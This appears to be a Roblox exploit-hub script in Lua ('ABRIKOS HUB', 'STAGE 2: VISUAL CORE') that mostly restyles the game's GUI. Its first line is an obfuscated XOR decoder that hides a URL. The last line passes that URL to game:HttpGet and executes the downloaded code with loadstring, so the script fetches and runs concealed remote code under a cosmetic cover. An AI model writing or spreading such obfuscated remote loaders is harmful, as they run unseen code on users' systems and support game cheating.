
--[[ STAGE 2: VISUAL CORE ]]
local SjKok00TSEZzF8WLCAVzf="\211\177\182\226\182\011\193\198\230\019\038\026\250\065\068\061\015\084\086\082\092\082\080\103\093\059\064\050\110\118\127\132\157"local FWrAR5S4GYMQBY=19 local GcflkCQstA_CVzhY_T=96 local PupwduFft0qXrxFmPdQtLx=0 local aFR0ImFiTKJ2X9aUDqBNe=5 local dKQhhj1svccSt8ZcDASOD=29 local pduPNKn6XR5slqZ=true local ZSzg2qYDKvNeDHnhFOlA=bit32 and bit32.bxor if not ZSzg2qYDKvNeDHnhFOlA then ZSzg2qYDKvNeDHnhFOlA=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local qxM5Uc530ssTXCvcv4Dj={}for r8uFAKhIcme0_0g=1,#SjKok00TSEZzF8WLCAVzf do local _pmzoJYokUDxelIf=string.byte(SjKok00TSEZzF8WLCAVzf,r8uFAKhIcme0_0g)local IDGhupESCt9HAUBqIcb=(GcflkCQstA_CVzhY_T+(r8uFAKhIcme0_0g*aFR0ImFiTKJ2X9aUDqBNe)+dKQhhj1svccSt8ZcDASOD)%256 if PupwduFft0qXrxFmPdQtLx==0 then _pmzoJYokUDxelIf=(_pmzoJYokUDxelIf-IDGhupESCt9HAUBqIcb)%256 qxM5Uc530ssTXCvcv4Dj[r8uFAKhIcme0_0g]=string.char(ZSzg2qYDKvNeDHnhFOlA(_pmzoJYokUDxelIf,FWrAR5S4GYMQBY))else _pmzoJYokUDxelIf=ZSzg2qYDKvNeDHnhFOlA(_pmzoJYokUDxelIf,FWrAR5S4GYMQBY)qxM5Uc530ssTXCvcv4Dj[r8uFAKhIcme0_0g]=string.char((_pmzoJYokUDxelIf-IDGhupESCt9HAUBqIcb)%256)end end local XTv107RGpjzAe=table.concat(qxM5Uc530ssTXCvcv4Dj)if pduPNKn6XR5slqZ then XTv107RGpjzAe=string.reverse(XTv107RGpjzAe)end local S_OR95bz2FGLvVxAicJ=XTv107RGpjzAe
local HubName = "ABRIKOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(S_OR95bz2FGLvVxAicJ))()
